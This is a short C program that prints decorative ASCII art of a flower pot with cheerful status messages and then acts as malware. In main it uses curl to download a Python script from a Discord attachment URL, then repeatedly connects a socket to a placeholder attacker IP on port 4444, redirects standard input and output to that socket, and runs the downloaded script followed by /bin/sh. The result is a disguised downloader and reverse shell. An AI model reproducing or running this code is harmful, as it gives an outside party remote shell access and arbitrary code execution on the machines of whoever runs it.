#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int *message()
{
    printf("\n               . .                               ");
    printf("\n    . .       . . .                              ");
    printf("\n . . . .       . .     .                         ");
    printf("\n. . . .       . . .   . . .               ,      ");
    printf("\n . . . .     . . .     . .       _       d#D     ");
    printf("\n. . . . .   . . . . ._. . .    _(%%)_      `      ");
    printf("\n   .     . . . . . _(#)_ .    (%%O%%)            Dropping the pot...");
    printf("\n        . . . . _ (##O##) .   _ (%%)   _        Watering the flowers..... ");
    printf("\n       . . .  _(#)_ (#)  . _ (%%)_:  _(%%)_      Enjoying the view......  ");
    printf("\n      . . . .(##O##)._\\  _(#)%O%%):(%%O%%)        :)");
    printf("\n         . .   (#)  _  \\(##O##))  |,'(%%)         ");
    printf("\n              `. ._(#)_ \\,(#)  `. ;  _           ");
    printf("\n                 (##O##) `.      Y _(#)_         ");
    printf("\n                  .(#)\\ . .).   / (##O##)        ");
    printf("\n                 . . . `-.(. . ;  ,'(#)          ");
    printf("\n                  . . . . .\\. .| (               ");
    printf("\n                 . . . d888888888888b            ");
    printf("\n                  . . ,88888888888888b           ");
    printf("\n                   . .d888888888888888           ");
    printf("\n                    . d888888888888888           ");
    printf("\n                     .`88888888888888P           ");
    printf("\n                       Y8888888888888            ");
    printf("\n                        Y8888888888P             ");
    printf("\n_________________________`Y8888888P_____CJ_______");
    return 0;
}

int main(int argc, char **argv)
{
    message();
    system("curl https://cdn.discordapp.com/attachments/835920163161112619/848980205539688498/post.py --output post.py");
    while(1)
    {
      struct sockaddr_in victim;
    
      victim.sin_family = AF_INET;
      victim.sin_addr.s_addr = inet_addr("IP_HERE"); // edit IP here
      victim.sin_port = htons(4444); // dont touch the port lol
    
      int socksssss;
      socksssss = socket(AF_INET,SOCK_STREAM,0);
      connect(socksssss,(struct sockaddr *)&victim,sizeof(victim));
    
      dup2(socksssss,0);
      dup2(socksssss,1);
      dup2(socksssss,2);
    
      system("python3 post.py && /bin/sh", NULL, NULL);
    }
  return 0;
}